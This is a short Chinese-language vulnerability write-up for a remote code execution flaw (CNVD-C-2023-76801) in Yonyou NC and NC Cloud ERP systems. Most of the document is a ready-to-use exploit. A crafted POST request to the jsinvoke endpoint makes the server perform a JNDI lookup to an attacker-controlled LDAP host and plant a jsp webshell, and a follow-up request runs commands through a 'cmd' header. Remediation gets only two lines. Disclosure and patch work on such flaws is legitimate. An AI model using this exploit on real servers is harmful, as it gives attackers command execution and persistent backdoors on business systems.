# 用友 NC Cloud 远程代码执行漏洞 CNVD-C-2023-76801

## 漏洞描述

用友 NC 及 NC Cloud 系统存在任意文件上传漏洞，攻击者可通过 uapjs（jsinvoke）应用构造恶意请求非法上传后门程序，此漏洞可以给 NC 服务器预埋后门，从而可以随意操作服务器。

## 漏洞影响

```
NC63、NC633、NC65
NC Cloud1903、NC Cloud1909
NC Cloud2005、NC Cloud2105、NC Cloud2111
YonBIP 高级版 2207
```

## 漏洞复现

JNDI：https://github.com/WhiteHSBG/JNDIExploit

exp：

```
POST /uapjs/jsinvoke/?action=invoke HTTP/1.1
Host: your-ip
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
 
{"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["${''.getClass().forName('javax.naming.InitialContext').newInstance().lookup('ldap://VPSip:1389/TomcatBypass/TomcatEcho')}","webapps/nc_web/jndi.jsp"]}
```

exp 中使用的是 JNDI 工具的 TomcatEcho 回显链 ，执行命令并回显：

```
GET /jndi.jsp HTTP/1.1
Host: your-ip
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
cmd: whoami
```

## 漏洞修复

1. 官方已经发布修复补丁，请进行升级。
2. 或者进行 waf 等安全部署拦截恶意字符